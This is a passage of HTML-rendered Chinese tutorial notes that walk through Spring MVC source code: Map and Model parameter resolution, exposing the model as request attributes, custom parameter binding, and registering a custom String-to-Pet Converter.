class="hljs-string">&quot;world&quot;</span>,world);<br>    map.put(<span class="hljs-string">&quot;message&quot;</span>,message);<br><br>    <span class="hljs-keyword">return</span> map;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>Map&lt;String,Object&gt; map</code></p></li><li><p><code>Model model</code></p></li><li><p><code>HttpServletRequest request</code></p></li></ul><p>上面三位都是可以给request域中放数据，用<code>request.getAttribute()</code>获取</p><p>接下来我们看看，<code>Map&lt;String,Object&gt; map</code>与<code>Model model</code>用什么参数处理器。</p><hr><p><code>Map&lt;String,Object&gt; map</code>参数用<code>MapMethodProcessor</code>处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapMethodProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span>, HandlerMethodReturnValueHandler &#123;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> (Map.class.isAssignableFrom(parameter.getParameterType()) &amp;&amp;<br>parameter.getParameterAnnotations().length == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Assert.state(mavContainer != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;ModelAndViewContainer is required for model exposure&quot;</span>);<br><span class="hljs-keyword">return</span> mavContainer.getModel();<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>mavContainer.getModel()</code>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelAndViewContainer</span> &#123;<br><br>    ...<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ModelMap</span> <span class="hljs-variable">defaultModel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BindingAwareModelMap</span>();<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> ModelMap redirectModel;<br><br>    ...<br><br><span class="hljs-keyword">public</span> ModelMap <span class="hljs-title function_">getModel</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (useDefaultModel()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.defaultModel;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.redirectModel == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.redirectModel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelMap</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.redirectModel;<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">useDefaultModel</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> (!<span class="hljs-built_in">this</span>.redirectModelScenario || (<span class="hljs-built_in">this</span>.redirectModel == <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.ignoreDefaultModelOnRedirect));<br>&#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><hr><p><code>Model model</code>用<code>ModelMethodProcessor</code>处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelMethodProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span>, HandlerMethodReturnValueHandler &#123;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> Model.class.isAssignableFrom(parameter.getParameterType());<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Assert.state(mavContainer != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;ModelAndViewContainer is required for model exposure&quot;</span>);<br><span class="hljs-keyword">return</span> mavContainer.getModel();<br>&#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p><code>return mavContainer.getModel();</code>这跟<code>MapMethodProcessor</code>的一致</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010247689.png" alt="在这里插入图片描述"></p><p><code>Model</code>也是另一种意义的<code>Map</code>。</p><hr><p><strong>接下来看看</strong><code>Map&lt;String,Object&gt; map</code>与<code>Model model</code>值是如何做到用<code>request.getAttribute()</code>获取的。</p><p>众所周知，所有的数据都放在 <strong>ModelAndView</strong>包含要去的页面地址View，还包含Model数据。</p><p>先看<strong>ModelAndView</strong>接下来是如何处理的？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <br>            ...<br><br><span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>            <br>            ...<br>            <br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>dispatchException = ex;<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br><span class="hljs-comment">// As of 4.3, we&#x27;re processing Errors thrown from handler methods as well,</span><br><span class="hljs-comment">// making them available for @ExceptionHandler methods and other scenarios.</span><br>dispatchException = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, err);<br>&#125;<br>        <span class="hljs-comment">//处理分发结果</span><br>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>&#125;<br>        ...<br><br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ...<br><br><span class="hljs-comment">// Did the handler return a view to render?</span><br><span class="hljs-keyword">if</span> (mv != <span class="hljs-literal">null</span> &amp;&amp; !mv.wasCleared()) &#123;<br>render(mv, request, response);<br>...<br>&#125;<br>...<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><br>View view;<br><span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> mv.getViewName();<br><span class="hljs-keyword">if</span> (viewName != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// We need to resolve the view name.</span><br>view = resolveViewName(viewName, mv.getModelInternal(), locale, request);<br><span class="hljs-keyword">if</span> (view == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;Could not resolve view with name &#x27;&quot;</span> + mv.getViewName() +<br><span class="hljs-string">&quot;&#x27; in servlet with name &#x27;&quot;</span> + getServletName() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// No need to lookup: the ModelAndView object contains the actual View object.</span><br>view = mv.getView();<br><span class="hljs-keyword">if</span> (view == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;ModelAndView [&quot;</span> + mv + <span class="hljs-string">&quot;] neither contains a view name nor a &quot;</span> +<br><span class="hljs-string">&quot;View object in servlet with name &#x27;&quot;</span> + getServletName() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>&#125;<br>&#125;<br>view.render(mv.getModelInternal(), request, response);<br>        <br>        ...<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>在Debug模式下，<code>view</code>属为<code>InternalResourceView</code>类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InternalResourceView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractUrlBasedView</span> &#123;<br>    <br> <span class="hljs-meta">@Override</span><span class="hljs-comment">//该方法在AbstractView，AbstractUrlBasedView继承了AbstractView</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Map&lt;String, ?&gt; model, HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br>        <br>Map&lt;String, Object&gt; mergedModel = createMergedOutputModel(model, request, response);<br>prepareResponse(request, response);<br>        <br>        <span class="hljs-comment">//看下一个方法实现</span><br>renderMergedOutputModel(mergedModel, getRequestToExpose(request), response);<br>&#125;<br>    <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderMergedOutputModel</span><span class="hljs-params">(</span><br><span class="hljs-params">Map&lt;String, Object&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">// Expose the model object as request attributes.</span><br>        <span class="hljs-comment">// 暴露模型作为请求域属性</span><br>exposeModelAsRequestAttributes(model, request);<span class="hljs-comment">//&lt;---重点</span><br><br><span class="hljs-comment">// Expose helpers as request attributes, if any.</span><br>exposeHelpers(request);<br><br><span class="hljs-comment">// Determine the path for the request dispatcher.</span><br><span class="hljs-type">String</span> <span class="hljs-variable">dispatcherPath</span> <span class="hljs-operator">=</span> prepareForRendering(request, response);<br><br><span class="hljs-comment">// Obtain a RequestDispatcher for the target resource (typically a JSP).</span><br><span class="hljs-type">RequestDispatcher</span> <span class="hljs-variable">rd</span> <span class="hljs-operator">=</span> getRequestDispatcher(request, dispatcherPath);<br><br>        ...<br>&#125;<br>    <br>    <span class="hljs-comment">//该方法在AbstractView，AbstractUrlBasedView继承了AbstractView</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exposeModelAsRequestAttributes</span><span class="hljs-params">(Map&lt;String, Object&gt; model,</span><br><span class="hljs-params">HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>model.forEach((name, value) -&gt; &#123;<br><span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>request.setAttribute(name, value);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>request.removeAttribute(name);<br>&#125;<br>&#125;);<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>exposeModelAsRequestAttributes</code>方法看出，<code>Map&lt;String,Object&gt; map</code>，<code>Model model</code>这两种类型数据可以给request域中放数据，用<code>request.getAttribute()</code>获取。</p><h2 id="35、请求处理-【源码分析】-自定义参数绑定原理"><a href="#35、请求处理-【源码分析】-自定义参数绑定原理" class="headerlink" title="35、请求处理-【源码分析】-自定义参数绑定原理"></a>35、请求处理-【源码分析】-自定义参数绑定原理</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParameterTestController</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 数据绑定：页面提交的请求数据（GET、POST）都可以和对象属性进行绑定</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> person</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@PostMapping(&quot;/saveuser&quot;)</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">saveuser</span><span class="hljs-params">(Person person)</span>&#123;<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *     姓名： &lt;input name=&quot;userName&quot;/&gt; &lt;br/&gt;</span><br><span class="hljs-comment"> *     年龄： &lt;input name=&quot;age&quot;/&gt; &lt;br/&gt;</span><br><span class="hljs-comment"> *     生日： &lt;input name=&quot;birth&quot;/&gt; &lt;br/&gt;</span><br><span class="hljs-comment"> *     宠物姓名：&lt;input name=&quot;pet.name&quot;/&gt;&lt;br/&gt;</span><br><span class="hljs-comment"> *     宠物年龄：&lt;input name=&quot;pet.age&quot;/&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> String userName;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Pet pet;<br>    <br>&#125;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String age;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>封装过程用到<code>ServletModelAttributeMethodProcessor</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ModelAttributeMethodProcessor</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><span class="hljs-comment">//本方法在ModelAttributeMethodProcessor类，</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> (parameter.hasParameterAnnotation(ModelAttribute.class) ||<br>(<span class="hljs-built_in">this</span>.annotationNotRequired &amp;&amp; !BeanUtils.isSimpleProperty(parameter.getParameterType())));<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//本方法在ModelAttributeMethodProcessor类，</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>...<br><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ModelFactory.getNameForParameter(parameter);<br><span class="hljs-type">ModelAttribute</span> <span class="hljs-variable">ann</span> <span class="hljs-operator">=</span> parameter.getParameterAnnotation(ModelAttribute.class);<br><span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) &#123;<br>mavContainer.setBinding(name, ann.binding());<br>&#125;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">attribute</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">BindingResult</span> <span class="hljs-variable">bindingResult</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span> (mavContainer.containsAttribute(name)) &#123;<br>attribute = mavContainer.getModel().get(name);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Create attribute instance</span><br><span class="hljs-keyword">try</span> &#123;<br>attribute = createAttribute(name, parameter, binderFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (BindException ex) &#123;<br>...<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (bindingResult == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// Bean property binding and validation;</span><br><span class="hljs-comment">// skipped in case of binding failure on construction.</span><br><span class="hljs-type">WebDataBinder</span> <span class="hljs-variable">binder</span> <span class="hljs-operator">=</span> binderFactory.createBinder(webRequest, attribute, name);<br><span class="hljs-keyword">if</span> (binder.getTarget() != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (!mavContainer.isBindingDisabled(name)) &#123;<br>                    <span class="hljs-comment">//web数据绑定器，将请求参数的值绑定到指定的JavaBean里面**</span><br>bindRequestParameters(binder, webRequest);<br>&#125;<br>validateIfApplicable(binder, parameter);<br><span class="hljs-keyword">if</span> (binder.getBindingResult().hasErrors() &amp;&amp; isBindExceptionRequired(binder, parameter)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BindException</span>(binder.getBindingResult());<br>&#125;<br>&#125;<br><span class="hljs-comment">// Value type adaptation, also covering java.util.Optional</span><br><span class="hljs-keyword">if</span> (!parameter.getParameterType().isInstance(attribute)) &#123;<br>attribute = binder.convertIfNecessary(binder.getTarget(), parameter.getParameterType(), parameter);<br>&#125;<br>bindingResult = binder.getBindingResult();<br>&#125;<br><br><span class="hljs-comment">// Add resolved attribute and BindingResult at the end of the model</span><br>Map&lt;String, Object&gt; bindingResultModel = bindingResult.getModel();<br>mavContainer.removeAttributes(bindingResultModel);<br>mavContainer.addAllAttributes(bindingResultModel);<br><br><span class="hljs-keyword">return</span> attribute;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>WebDataBinder 利用它里面的 Converters 将请求数据转成指定的数据类型。再次封装到JavaBean中</strong></p><p><strong>在过程当中，用到GenericConversionService：在设置每一个值的时候，找它里面的所有converter那个可以将这个数据类型（request带来参数的字符串）转换到指定的类型</strong></p><h2 id="36、请求处理-【源码分析】-自定义Converter原理"><a href="#36、请求处理-【源码分析】-自定义Converter原理" class="headerlink" title="36、请求处理-【源码分析】-自定义Converter原理"></a>36、请求处理-【源码分析】-自定义Converter原理</h2><p>未来我们可以给WebDataBinder里面放自己的Converter；</p><p>下面演示将字符串<code>“啊猫,3”</code>转换成<code>Pet</code>对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1、WebMvcConfigurer定制化SpringMVC的功能</span><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFormatters</span><span class="hljs-params">(FormatterRegistry registry)</span> &#123;<br>            registry.addConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Converter</span>&lt;String, Pet&gt;() &#123;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">convert</span><span class="hljs-params">(String source)</span> &#123;<br>                    <span class="hljs-comment">// 啊猫,3</span><br>                    <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(source))&#123;<br>                        <span class="hljs-type">Pet</span> <span class="hljs-variable">pet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>();<br>                        String[] split = source.split(<span class="hljs-string">&quot;,&quot;</span>);<br>                        pet.setName(split[<span class="hljs-number">0</span>]);<br>                        pet.setAge(Integer.parseInt(split[<span class="hljs-number">1</span>]));<br>                        <span class="hljs-keyword">return</span> pet;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="37、响应处理-【源码分析】-ReturnValueHandler原理"><a href="#37、响应处理-【源码分析】-ReturnValueHandler原理" class="headerlink" title="37、响应处理-【源码分析】-ReturnValueHandler原理"></a>37、响应处理-【源码分析】-ReturnValueHandler原理</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010403920.jpg" alt="在这里插入图片描述"></p><p>假设给前端自动返回json数据，需要引入相关的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 